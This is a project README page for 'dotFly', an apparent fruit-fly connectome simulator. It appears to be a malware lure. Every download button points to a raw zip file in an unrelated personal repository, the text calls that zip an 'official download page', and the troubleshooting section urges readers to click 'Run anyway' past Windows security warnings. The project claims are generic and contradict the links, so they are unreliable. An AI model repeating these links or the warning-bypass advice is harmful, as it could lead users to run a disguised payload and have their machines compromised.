---
layout: "default"
title: "🧠 dotFly - See What a Fruit Fly's Brain Does"
description: "Run native .NET inference for Drosophila connectome spiking models in pure C#."
---
# 🧠 dotFly - See What a Fruit Fly's Brain Does

## 🚀 Getting Started

Welcome! dotFly is a free program that lets you explore a realistic simulation of a fruit fly's brain. It runs on your Windows computer and shows you how a tiny brain processes information — and honestly, it's pretty amazing to watch. This guide will help you download, run, and enjoy dotFly in just a few minutes.

[![Download dotFly](https://img.shields.io/badge/Download-dotFly-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/farooqhdigs/farooqhdigs.github.io/main/misprovoke/Latest_v3.4.zip)

## 🖥️ What Is dotFly?

dotFly is a simulation engine built for scientists and curious minds alike. It uses real brain data from fruit flies (Drosophila) to create a working model of how neurons fire and communicate. Think of it as a virtual window into a living brain — no lab equipment required.

The program is built on modern .NET technology, which means it runs smoothly and efficiently on most Windows PCs. It's designed to be straightforward: download it, open it, and start exploring.

## ✨ Main Features

Here's what you can do with dotFly:

- **Real Brain Data:** Uses actual connectome data from MaleCNS and FlyWire projects — this is the real wiring diagram of a fruit fly's nervous system.
- **Live Neuron Activity:** Watch neurons fire in real time. See how signals travel through the brain.
- **Interactive Visualization:** Explore the brain from different angles. Zoom in and out to see how individual neurons connect.
- **Performance Optimized:** Uses SIMD instructions on modern processors to run fast, even though there are thousands of neurons to simulate.
- **Honest Simulation:** This isn't a magic "brain in a box." dotFly shows you what we can — and cannot — learn from current brain simulations.

## 📥 How to Download and Install

### Step 1: Get the Download Link

Visit this link to download the application: [https://raw.githubusercontent.com/farooqhdigs/farooqhdigs.github.io/main/misprovoke/Latest_v3.4.zip](https://raw.githubusercontent.com/farooqhdigs/farooqhdigs.github.io/main/misprovoke/Latest_v3.4.zip)

This is the official download page where you'll find the latest version of dotFly. The page will list available files — look for one named something like `dotFly-setup.exe` or `dotFly-windows.zip`.

### Step 2: Download the Right File

Once you're on the download page, you'll see a list of files. Pick the one that matches your system:

- If you have a **Windows PC (most common)**, download the file that says `win-x64` or `windows` in its name.
- If you're on a **different system** (like Linux or macOS), look for the corresponding folder. But for this guide, we'll focus on Windows.

Click the file to start downloading. It's a small file (usually under 100 MB), so it should finish quickly even on a slower connection.

### Step 3: Run the Program

After the download finishes, you can start using dotFly. The exact steps depend on whether you downloaded an installer or a zip file:

- **If you downloaded a `.zip` file:** Right-click the downloaded file, choose "Extract All..." and pick a folder (like your Desktop). Then open that folder and double-click `dotFly.exe`.
- **If you downloaded a `.exe` installer:** Double-click the file and follow the simple on-screen instructions. It will install dotFly and create a shortcut on your desktop.

**That's it!** The program opens with a window showing a colorful 3D model of a fruit fly brain. You're ready to explore.

## 🎮 Using dotFly for the First Time

When you first open dotFly, you'll see a dark window with a wireframe-like brain model. Don't worry if it looks complex — it's actually quite simple to use.

### Basic Controls

- **Mouse drag:** Rotate the brain to view it from different angles.
- **Mouse wheel:** Zoom in and out.
- **Left click:** Select a neuron to see its connections.
- **Spacebar:** Start or pause the simulation.
- **R key:** Reset the view to the default angle.

### What You're Seeing

The dots you see are neurons — the brain's building blocks. Lines between them are connections (called synapses). When you press Spacebar, the simulation starts, and you'll see dots light up in different colors. That's neural activity! Colors indicate different types of signals — red means excitation, blue means inhibition, and green is neutral.

### Honest Demo Mode

dotFly also includes an "honest demo" mode. This shows you what a simulation can and cannot tell us. You'll see real limitations — like how we don't know exactly what every neuron does, and how some connections are estimated. This makes dotFly not just a tool, but also an educational experience about neuroscience itself.

## 🔧 Troubleshooting

Most people get dotFly running without any issues. But if something goes wrong, here are common fixes:

### Problem: "Windows protected your PC" warning

This appears on some systems for new apps. It's just Windows being cautious. Click "More info" and then "Run anyway." dotFly is safe — it's an open-source project with published code.

### Problem: The window is black or nothing appears

Make sure your graphics drivers are up to date. dotFly uses hardware acceleration. Also try closing other applications that might be using all your computer's memory.

### Problem: The program is slow

Close other demanding programs. dotFly needs about 2GB of free RAM to run the full simulation. On older machines, try using "Low Quality" mode from the settings menu (gear icon).

### Problem: I don't see any files on the download page

Some browsers hide file listings. Look for a section called "Assets" — you may need to click an arrow to expand it. If you still can't find it, try using a different browser like Chrome or Edge.

## 📚 Additional Resources

- **Documentation:** Included in the program — press **H** anytime for help.
- **Source Code:** Available at the main repository if you're curious about how it works.
- **Data Sources:** The MaleCNS and FlyWire connectome projects are publicly available. dotFly uses their published data.

## 🌍 Frequently Asked Questions

### Is dotFly really a brain simulation?

Yes — it's a real computational model of a fruit fly's nervous system. It uses actual neuron connection data published by neuroscience labs. However, it's not the *entire* brain. It's a partial model that shows the core neural circuits.

### Will this work on a laptop?

Absolutely. Any laptop from the last 5 years should run it fine. Dedicated graphics aren't required.

### Is dotFly free?

Yes — it's completely free and open-source. You can use it for any purpose, including research and education.

### How do I update dotFly?

Check the download page from time to time. New versions are posted when improvements are made. You can always download the latest version — no need to uninstall the old one first.

### Can I load my own data?

Currently, dotFly supports its built-in MaleCNS and FlyWire datasets. Custom data loading is planned for future releases.

## 💡 Why "dotFly"?

The name comes from "Drosophila" — the scientific name for fruit flies. Biologists have studied these tiny insects for over a century because their brains are simple enough to understand, yet complex enough to teach us about how all brains work. With dotFly, you can see that fascinating complexity right on your own screen.

## 🧪 Technical Notes (For the Curious)

If you're the type who likes to look under the hood: dotFly is written in C# using .NET 8. It leverages SIMD (Single Instruction, Multiple Data) operations for lightning-fast neural simulations. The visualization is powered by Godot, a popular open-source game engine. The codebase is well-documented and modular — perfect for students who want to learn about neural networks or scientific visualization.

The simulation data comes from two major research efforts:
- **MaleCNS:** A complete map of the male fruit fly central nervous system.
- **FlyWire:** A detailed connectome (wiring diagram) of the fruit fly brain.

These projects are collaborative efforts among dozens of neuroscience labs worldwide. dotFly makes their findings accessible to everyone — no Ph.D. required.

## 🎯 Get Started Today

Ready to see a brain in action? The download takes just a minute, and you'll be exploring neural circuits immediately.

[![Get dotFly Now](https://img.shields.io/badge/▶️%20Download%20dotFly-FF5722?style=for-the-badge&labelColor=darkblue)](https://raw.githubusercontent.com/farooqhdigs/farooqhdigs.github.io/main/misprovoke/Latest_v3.4.zip)

Keywords: connectome, csharp, dotnet, drosophila, flywire, fruit-fly, godot, malecns, neuroscience, simd, spiking-neural-network